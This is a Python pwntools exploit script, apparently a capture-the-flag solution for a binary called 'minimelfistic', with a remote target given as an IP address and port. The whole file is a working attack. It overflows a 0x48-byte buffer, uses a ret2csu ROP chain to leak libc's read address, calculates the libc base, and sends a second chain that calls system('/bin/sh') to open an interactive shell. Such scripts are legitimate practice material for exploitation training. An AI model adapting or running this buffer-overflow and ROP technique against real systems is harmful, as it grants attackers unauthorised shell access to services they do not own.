import pwn
elf = pwn.context.binary = pwn.ELF("./minimelfistic")
pwn.context.terminal = ['tmux', 'splitw', '-h']
if pwn.args.GDB:
    p = pwn.gdb.debug(elf.path, gdbscript="b *0x00000000004009dc\nc\n")
    libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")

elif pwn.args.REMOTE:
    p = pwn.remote("134.209.186.58", 30123)
    libc = pwn.ELF("./libc.so.6")
else:
    libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")
    p = elf.process()
pwn.context.clear(arch='amd64', os='linux')
rop = pwn.ROP(elf)
rop.ret2csu(1, elf.got.read, 8, 4, 5, 6, 7, 8, 9)
rop.call(elf.plt.write)
rop.call(elf.sym.main)
ret = 0x00000000004009dc


payload = b"9"*0x48
payload += rop.chain()
print(rop.dump())
p.sendlineafter(b">", payload)
p.recvuntil(b"deactivated!\n")
leak = p.recvline(keepends=False)
leak = pwn.unpack(leak, 'all')
print(hex(leak))
libc.address = leak - libc.sym.read
print(hex(libc.address))
rop2 = pwn.ROP(libc)
# rop2.execve("/bin/sh", 0, 0)
bin_sh = next(libc.search(b'/bin/sh'))
rop2.system(bin_sh)
print(rop2.dump())
payload2 = b"9"*0x48
payload2 += rop2.chain()
p.sendlineafter(b">", payload2)

p.interactive()
